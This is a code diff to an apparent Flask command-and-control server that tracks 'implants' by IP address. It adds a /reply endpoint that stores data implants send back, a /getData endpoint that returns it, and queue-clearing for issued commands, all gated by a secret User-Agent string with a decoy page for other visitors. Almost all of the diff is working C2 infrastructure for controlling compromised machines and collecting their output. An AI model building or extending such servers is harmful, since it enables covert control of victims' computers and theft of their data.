@@ -26,6 +26,36 @@ dbpath = "sqlite:///data/real.db"
 def makeId(length=10):
     return (''.join(random.choice(string.ascii_lowercase) for i in range(length))).upper()
 
+def addData(data, data_ip):
+    print(data)
+    print(data_ip)
+    connection = sqlite3.connect("./data/real.db")
+    cursor = connection.cursor()
+    results = [x for x in cursor.execute("SELECT id FROM Implants WHERE IP=?", [data_ip])]
+    if len(results) == 0:
+        return "No implants found"
+    else:
+        #find if implant has already done tasks, if so add it, otherwise create new
+        #added new data schema, Tasks
+        results = [x for x in cursor.execute("SELECT * FROM Tasks WHERE data_ip=?", [data_ip])]
+        if len(results) == 0:
+            #add it to Tasks
+            data_input = [data, data_ip]
+            cursor.execute('INSERT INTO Tasks (data, data_ip)\
+                 VALUES (?, ?)', data_input)
+            connection.commit()
+        else:
+            #results has the id?
+            new_data = data
+            print("NEW DATA:" + results[0][0])
+            data_input = [new_data, data_ip]
+            cursor.execute('INSERT INTO Tasks (data, data_ip)\
+                 VALUES (?, ?)', data_input)
+            connection.commit()
+
+    connection.close()
+    return "I hope this worked"
+
 
 def addImplant(data):
     connection = sqlite3.connect("./data/real.db")
@@ -55,6 +85,24 @@ def addImplant(data):
 
     connection.close()
     return ("Successfully added to database")
+
+
+@ app.route("/getData")
+def getData():
+    print(request.headers["User-Agent"])
+    if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
+        data = json.loads(request.get_data())
+        ip = data["IP"]
+        print(ip)
+        connection = sqlite3.connect("./data/real.db")
+        cursor = connection.cursor()
+        ans = []
+        for row in cursor.execute("select * from Tasks WHERE data_ip=?", [ip]):
+            ans.append(row)
+        connection.close()
+        return jsonify(output=ans)
+    else:
+        return render_template("wrongTurn.html")
 
 
 @ app.route("/sqlcheck")
@@ -100,10 +148,20 @@ def check():
         # return redirect("https://www.youtube.com/watch?v=Pv0CA1rjGfg")
 
 
-@ app.route("/jason")
-def jason():
-    print(request.get_data())
-    return request.get_data()
+
+@ app.route("/reply", methods=['POST'])
+def reply():
+    if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
+        data = request.data.decode("utf-8")
+        data_ip = request.remote_addr
+
+        #save data
+        return addData(data, data_ip)
+    else:
+        return render_template("wrongTurn.html")
+        # return redirect("https://www.youtube.com/watch?v=Pv0CA1rjGfg")
+
+
 
 @ app.route("/remote", methods=['POST', 'GET'])
 def cmds():
@@ -141,13 +199,18 @@ def getJobs():
         ans = []
         for x in cursor.execute("SELECT cmdQ FROM Implants WHERE IP = ?", [ip]):
             ans+=x
+        cursor.execute("UPDATE Implants SET cmdQ = ? WHERE IP = ?", ("No Cmds", ip))
+        connection.commit()
+        connection.close()
         print(ans)
         if len(ans)==0:
             return str("No Tasks")
         else:
             return str(ans)
+        
     else:
         return render_template("wrongTurn.html")
+    
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0")
